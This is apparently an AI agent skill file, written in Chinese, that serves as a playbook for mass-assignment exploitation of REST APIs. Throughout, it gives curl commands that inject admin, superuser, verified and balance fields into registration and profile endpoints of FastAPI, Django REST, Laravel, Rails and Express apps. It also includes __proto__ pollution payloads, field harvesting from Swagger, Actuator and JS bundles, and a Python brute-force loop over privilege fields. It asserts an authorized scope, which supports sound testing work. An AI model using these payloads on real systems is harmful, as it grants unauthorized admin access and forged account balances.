---
name: 群赋
description: >-
 Mass Assignment / 批量赋值漏洞完整手法：REST API 参数注入升权、
 FastAPI/Django/Rails/Laravel/Node.js 各框架利用、
 role/admin/verified/balance 字段注入、嵌套对象注入、
 Swagger/OpenAPI 字段挖掘。
 字段级 JWT 篡改走 jwt-bypass-pentest；RBAC API 走 rbac-bypass-authz。
version: 1.0.0
---

# Mass Assignment 批量赋值漏洞

## 作业入口（先跑这个）

```bash
python3 炼蛊房/param_abuse_probe.py mass --url https://授权/api/register \
  --base '{"username":"se1","password":"Se1!se"}' --extra role=admin --case <案>
```

作业手法：`传承/群赋.md`。JWT claim 走 `jwt_forge_probe`。

**前提**：目标在 `授权范围`。

---

## 核心原理

服务端将请求体的所有字段自动绑定到模型/对象，但没有显式白名单，导致攻击者可以注入隐藏字段（如 `role`、`isAdmin`、`verified`、`balance`）。

```
用户注册时提交：{"username":"hack","password":"pass","role":"admin"}
服务端：User.create(request.body) // 所有字段都绑定！
结果：管理员账号被创建
```

---

## §1 注册/更新时提权

### 注册时注入特权字段

```bash
# 基础 - 注册时注入 role/isAdmin
curl -s -X POST "https://授权站/api/register" \
 -H "Content-Type: application/json" \
 -d '{"username":"hacker","password":"Pass1234!","role":"admin"}'

curl -s -X POST "https://授权站/api/register" \
 -H "Content-Type: application/json" \
 -d '{"username":"hacker","password":"Pass1234!","isAdmin":true,"verified":true}'

# 注册后登录验证
curl -s -X POST "https://授权站/api/login" \
 -H "Content-Type: application/json" \
 -d '{"username":"hacker","password":"Pass1234!"}'

# 检查是否有管理员权限
curl -s "https://授权站/api/admin/users" \
 -H "Authorization: Bearer $NEW_TOKEN"
```

### 更新个人资料时提权

```bash
# PATCH /api/user/profile - 注入隐藏字段
curl -s -X PATCH "https://授权站/api/user/profile" \
 -H "Content-Type: application/json" \
 -H "Authorization: Bearer $TOKEN" \
 -d '{"nickname":"hack","role":"admin","isAdmin":true,"adminLevel":1}'

# PUT 全量更新
curl -s -X PUT "https://授权站/api/users/me" \
 -H "Content-Type: application/json" \
 -H "Authorization: Bearer $TOKEN" \
 -d '{"id":1,"email":"hack@test.com","role":"admin","permissions":["*"]}'

# 充值/余额字段
curl -s -X POST "https://授权站/api/profile/update" \
 -H "Content-Type: application/json" \
 -H "Authorization: Bearer $TOKEN" \
 -d '{"nickname":"test","balance":99999,"vipLevel":10,"creditScore":1000}'
```

---

## §2 字段发现（关键前置）

### 从 API 文档提取

```bash
# Swagger/OpenAPI
curl -s "https://授权站/swagger.json" | jq '.definitions.User.properties | keys'
curl -s "https://授权站/api-docs" | jq '.'
curl -s "https://授权站/openapi.json" | jq '.components.schemas.UserCreate.properties'

# Spring Boot Actuator
curl -s "https://授权站/actuator/mappings" | jq '.contexts[].mappings'
```

### 从 GET 响应推断

```bash
# GET 当前用户信息（包含所有字段名）
curl -s "https://授权站/api/user/me" \
 -H "Authorization: Bearer $TOKEN" | jq 'keys'

# 输出示例：["id","email","username","role","isAdmin","balance","verified","createdAt"]
# → 找到 role/isAdmin/balance/verified 后，POST/PATCH 时注入这些字段
```

### 前端 JS 中提取

```bash
# 从 SPA bundle 找 API 请求构造代码
curl -s "https://授权站/js/app.js" | grep -oE '"role"|"isAdmin"|"admin"|"verified"|"balance"|"credits"'

# 找 axios/fetch 请求体构建处
grep -oE 'data:\s*\{[^}]+\}' app.js | head -20
```

---

## §3 框架特定利用

### FastAPI（Python）

```bash
# FastAPI 使用 Pydantic 模型，但如果模型包含可选字段且无 validator
# 常见场景：BaseModel 的 Optional 字段在更新时被接受

# 探测：注册时多加字段，看是否返回 422 或 200
curl -s -X POST "https://授权站/api/v1/auth/register" \
 -H "Content-Type: application/json" \
 -d '{"email":"test@test.com","password":"Pass1234!","is_superuser":true,"is_active":true}'

# FastAPI 常见字段
# is_superuser / is_admin / is_staff / is_verified
# role / permissions / scopes
```

### Django REST Framework

```bash
# DRF 的 ModelSerializer 默认包含所有字段
# 如果视图没有显式 fields/read_only_fields

curl -s -X POST "https://授权站/api/users/" \
 -H "Content-Type: application/json" \
 -d '{"username":"hack","password":"Pass1234!","is_staff":true,"is_superuser":true}'

# 更新
curl -s -X PATCH "https://授权站/api/users/me/" \
 -H "Authorization: Token $TOKEN" \
 -H "Content-Type: application/json" \
 -d '{"is_staff":true,"groups":[1]}'
```

### Laravel（PHP）

```bash
# Eloquent 的 $fillable / $guarded 控制，但常见误配（$guarded = []）
# 或者忘记在 $fillable 中排除特权字段

curl -s -X POST "https://授权站/api/register" \
 -H "Content-Type: application/json" \
 -d '{"name":"hack","email":"h@t.com","password":"Pass1234!","role_id":1,"is_admin":1}'

# 测试 /api/user/update
curl -s -X PUT "https://授权站/api/user" \
 -H "Authorization: Bearer $TOKEN" \
 -H "Content-Type: application/json" \
 -d '{"name":"hack","role_id":1,"email_verified_at":"2020-01-01","is_admin":1}'
```

### Rails（Ruby）

```bash
# Rails 5+ 使用 Strong Parameters（params.permit），但仍有遗漏
# 早期版本 attr_accessible 可能被绕过

curl -s -X POST "https://授权站/users" \
 -H "Content-Type: application/json" \
 -d '{"user":{"email":"h@t.com","password":"p","admin":true,"role":"admin"}}'

# 嵌套参数测试
curl -s -X PATCH "https://授权站/api/users/me" \
 -H "Authorization: Bearer $TOKEN" \
 -H "Content-Type: application/json" \
 -d '{"user":{"role":"admin"}}'
```

### Express/Node.js

```bash
# Express + Mongoose 或 Sequelize 可能直接 Model.create(req.body)
curl -s -X POST "https://授权站/api/users/register" \
 -H "Content-Type: application/json" \
 -d '{"username":"hack","password":"pass","role":"admin","__v":0}'

# 尝试 __proto__ 污染（同时测试 PP）
curl -s -X POST "https://授权站/api/profile" \
 -H "Content-Type: application/json" \
 -d '{"name":"test","__proto__":{"isAdmin":true}}'
```

---

## §4 嵌套对象注入

```bash
# 关系对象注入
curl -s -X POST "https://授权站/api/register" \
 -H "Content-Type: application/json" \
 -d '{
 "username":"hack",
 "password":"Pass1234!",
 "profile":{"avatar":"x"},
 "permissions":["admin","write","delete"],
 "metadata":{"verified":true,"tier":"enterprise"}
 }'

# 数组字段提权
curl -s -X PATCH "https://授权站/api/user/roles" \
 -H "Authorization: Bearer $TOKEN" \
 -H "Content-Type: application/json" \
 -d '{"roles":["user","admin","superadmin"]}'
```

---

## §5 批量测试脚本

```python
import requests, json

BASE = "https://授权站"
INJECT_FIELDS = [
 {"role": "admin"},
 {"isAdmin": True},
 {"is_admin": True},
 {"admin": True},
 {"role_id": 1},
 {"roleId": "admin"},
 {"permissions": ["admin"]},
 {"verified": True},
 {"is_superuser": True},
 {"is_staff": True},
 {"level": 9},
 {"vip": True},
 {"balance": 99999},
 {"credits": 99999},
 {"authorityId": 777}, # GVA
 {"authority": "ADMIN"},
]

headers = {"Content-Type": "application/json", "Authorization": f"Bearer YOUR_TOKEN"}

for fields in INJECT_FIELDS:
 payload = {"nickname": "test", **fields}
 try:
 r = requests.patch(f"{BASE}/api/user/profile", json=payload, headers=headers, timeout=5)
 if r.status_code not in [400, 422]:
 print(f"[+] 可能命中: {fields} → {r.status_code} {r.text[:100]}")
 else:
 print(f"[-] 拒绝: {fields} → {r.status_code}")
 except Exception as e:
 print(f"[!] 错误: {e}")
```

---

## 成功口径

| 档 | 条件 |
|----|------|
| L1 | 字段被接受（200，无 422/400 拒绝） |
| L2 | 注入字段生效（GET /me 返回 role=admin） |
| L3 | 管理员端点 200 / 余额增加 |

---

## 真源

- 手法：`传承/群赋.md`
- 工具：`python3 炼蛊房/param_abuse_probe.py mass --help`
- 角色接口：`python3 炼蛊房/rbac_bypass_probe.py --help`
